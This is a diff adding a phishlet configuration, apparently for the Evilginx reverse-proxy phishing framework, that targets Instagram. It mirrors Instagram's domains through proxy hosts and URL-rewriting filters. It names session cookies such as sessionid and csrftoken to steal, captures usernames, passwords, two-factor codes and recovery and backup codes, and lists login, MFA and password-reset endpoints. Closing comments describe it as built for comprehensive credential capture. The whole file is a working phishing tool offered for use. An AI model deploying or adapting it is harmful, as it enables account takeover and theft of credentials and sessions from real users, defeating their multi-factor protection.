@@ -1,0 +1,123 @@
+name: 'Instagram Phishlet'
+author: 'HTB'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true }
+  - { phish_sub: 'api', orig_sub: 'i', domain: 'instagram.com', session: false, is_landing: false }
+  - { phish_sub: 'graph', orig_sub: 'graph', domain: 'instagram.com', session: false, is_landing: false }
+  - { phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false }
+  - { phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com', session: false, is_landing: false }
+  - { phish_sub: 'z-p42', orig_sub: 'z-p42', domain: 'instagram.com', session: false, is_landing: false }
+  - { phish_sub: 'z-p15', orig_sub: 'z-p15', domain: 'instagram.com', session: false, is_landing: false }
+  - { phish_sub: 'secure', orig_sub: '', domain: 'instagram.com', session: false, is_landing: false }
+
+sub_filters: 
+  - { triggers_on: 'www.instagram.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'www.instagram.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*', 'application/x-www-form-urlencoded']} 
+  - { triggers_on: 'www.instagram.com', orig_sub: 'i', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'i.instagram.com', replace: 'api.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain', 'application/x-www-form-urlencoded']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'graph', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'graph.instagram.com', replace: 'graph.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain', 'application/x-www-form-urlencoded']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'static', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'static.cdninstagram.com', replace: 'static.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'image/*', 'font/*']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'scontent', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'scontent.cdninstagram.com', replace: 'scontent.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'image/*', 'font/*']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'z-p42', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'z-p42.instagram.com', replace: 'z-p42.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'image/*', 'font/*']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'z-p15', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'z-p15.instagram.com', replace: 'z-p15.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'image/*', 'font/*']}
+  - { triggers_on: 'www.instagram.com', orig_sub: '', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'instagram.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*', 'application/x-www-form-urlencoded']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: '"instagram.com"', replace: '"{hostname}"', mimes: ['application/javascript', 'application/json', 'text/plain']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: '//www.instagram.com', replace: '//{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'wss://edge-chat.instagram.com', replace: 'wss://{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+  - { triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', hostname: '{hostname}', sub: 'www', domain: 'instagram.com', search: 'edge-chat.instagram.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+
+auth_tokens:
+  - domain: 'instagram.com'
+    keys: ['sessionid', 'csrftoken', 'ds_user_id', 'ig_did', 'rur', 'mid', 'shbid', 'shbts', 'datr', 'ig_nrcb', 'ig_direct_region_hint', 'urlgen', 'fbm_', 'fbsr_', 'dpr', 'x-ig-app-id', 'x-csrftoken']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  email:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  emailOrPhone:
+    key: 'emailOrPhone'
+    search: '(.*)'
+    type: 'post'
+  phone_number:
+    key: 'phone_number'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  enc_password:
+    key: 'enc_password'
+    search: '(.*)'
+    type: 'post'
+  two_factor_identifier:
+    key: 'two_factor_identifier'
+    search: '(.*)'
+    type: 'post'
+  verificationCode:
+    key: 'verificationCode'
+    search: '(.*)'
+    type: 'post'
+  security_code:
+    key: 'security_code'
+    search: '(.*)'
+    type: 'post'
+  verification_code:
+    key: 'verification_code'
+    search: '(.*)'
+    type: 'post'
+  verification_method:
+    key: 'verification_method'
+    search: '(.*)'
+    type: 'post'
+  identifier:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  challenge_context:
+    key: 'challenge_context'
+    search: '(.*)'
+    type: 'post'
+  recovery_code:
+    key: 'recovery_code'
+    search: '(.*)'
+    type: 'post'
+  backup_code:
+    key: 'backup_code'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - "https://{hostname}/accounts/login/"
+  - "https://api.{hostname}/api/v1/accounts/login/"
+  - "https://api.{hostname}/api/v1/web/accounts/login/ajax/"
+  - "https://api.{hostname}/api/v1/accounts/two_factor_login/"
+  - "https://api.{hostname}/api/v1/accounts/send_two_factor_login_sms/"
+  - "https://api.{hostname}/api/v1/accounts/validate_two_factor_login_sms/"
+  - "https://api.{hostname}/api/v1/accounts/challenge_login/"
+  - "https://api.{hostname}/api/v1/accounts/login/ajax/"
+  - "https://api.{hostname}/api/v1/accounts/send_verify_email/"
+  - "https://api.{hostname}/api/v1/accounts/send_sms_code/"
+  - "https://api.{hostname}/api/v1/accounts/verify_sms_code/"
+  - "https://api.{hostname}/api/v1/accounts/account_recovery_send_ajax/"
+  - "https://api.{hostname}/api/v1/accounts/one_tap_app_login/"
+  - "https://graph.{hostname}/logging_client_events"
+  - "https://{hostname}/accounts/onetap/"
+  - "https://{hostname}/accounts/password/reset/"
+  - "https://{hostname}/accounts/password/reset/confirm/"
+  - "https://{hostname}/accounts/recovery/password/"
+
+login:
+  domain: 'instagram.com'
+  path: '/accounts/login/'
+  url: 'https://www.instagram.com/accounts/login/'
+
+# This is an advanced Instagram phishlet configured for comprehensive credential capture
+# Includes handling for multi-factor authentication, security challenges, and API endpoints
+# Designed to capture all possible authentication flows including mobile and desktop
+# This is designed by Lxkhanin dont change authors names
